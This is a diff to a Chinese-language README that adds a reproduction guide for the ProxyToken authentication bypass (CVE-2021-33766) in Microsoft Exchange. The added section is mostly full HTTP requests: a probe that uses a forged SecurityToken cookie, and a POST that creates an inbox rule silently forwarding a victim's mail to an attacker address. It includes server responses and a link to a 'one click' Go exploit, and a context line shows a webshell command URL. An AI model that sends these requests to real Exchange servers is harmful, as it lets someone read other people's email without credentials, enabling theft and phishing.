@@ -211,14 +211,77 @@ view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Wri
 
  - [PROXYTOKEN: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server)
  - [CVE-2021-33766-ProxyToken](https://github.com/demossl/CVE-2021-33766-ProxyToken)
- - Options
+ - [CVE-2021-33766](https://github.com/bhdresh/CVE-2021-33766)
+
+## proxytoken复现
+
+ - Note: 此漏洞可被用来进行exchange邮箱窃取，钓鱼，社工角色伪装等，只需邮箱名无需任何密码即可利用
+
+### burpsuite请求包分析
+
+1. 第一步发送如下请求包查看proxytoken漏洞是否存在，其中test@exchange2016.com是攻击者想要读取邮件的那个邮箱地址
 
 ``` bash
-    -te: is the email that you want to redirect to...
-    -ve: is the email that you want to attack and read...
+GET /ecp/test@exchange2016.com/PersonalSettings/HomePage.aspx?showhelp=false HTTP/1.1
+Host: 192.168.186.130
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Cookie: SecurityToken=x
 ```
 
+返回响应包页面状态为200，响应头中存在"msExchEcpCanary="及值，代表漏洞存在
+
  - ![](pics/proxytoken.png)
+
+2. 第二步发送如下请求包，构造邮件转发规则到test@exchange2016.com邮箱，后续所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱，从而实现任意邮箱读取
+
+``` bash
+POST /ecp/test@exchange2016.com/RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary=FrgLJ_16A0Wr_5nhVivj6vBJGbdFFtsIzwQBoOvKIiUzB1yV5wMJqzG8oRfNd1HWUKm33fyrJ-I. HTTP/1.1
+Host: 192.168.186.130
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Cookie: SecurityToken=x
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 327
+
+
+{"properties":{"RedirectTo":[{"RawIdentity":"proxymail@exchange2016.com","DisplayName":"proxymail@exchange2016.com","Address":"proxymail@exchange2016.com","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"proxymail@exchange2016.com"}],"Name":"Testrule","StopProcessingRules":true}}
+```
+
+返回响应包页面状态为200，响应内容如下，代表漏洞存在
+
+``` bash
+{"d":{"__type":"RuleRowResults:ECP","Cmdlets":["New-InboxRule"],"ErrorRecords":[],"Informations":[],"IsDDIEnabled":false,"Warnings":[],"Output":null}}
+```
+
+ - ![](pics/proxytoken1.png)
+
+### golang proxytoken one click exploit
+
+ - [proxytoken.go](./proxytoken.go)
+ - Use Options:
+
+``` bash
+-te: is the email that you want to redirect to...
+-ve: is the email that you want to attack and read the email ...
+```
+
+ - ![](pics/proxytoken2.png)
+
+邮件转发规则修改结果
+
+ - ![](pics/proxytoken3.png)
+
+邮件发送测试，如下图，所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱
+
+ - ![](pics/proxytoken4.png)
+ - ![](pics/proxytoken5.png)
+ - ![](pics/proxytoken6.png)
 
 # Exchange Authenticated RCE CVE-2021-42321
 ## CVE-2021-42321 part links
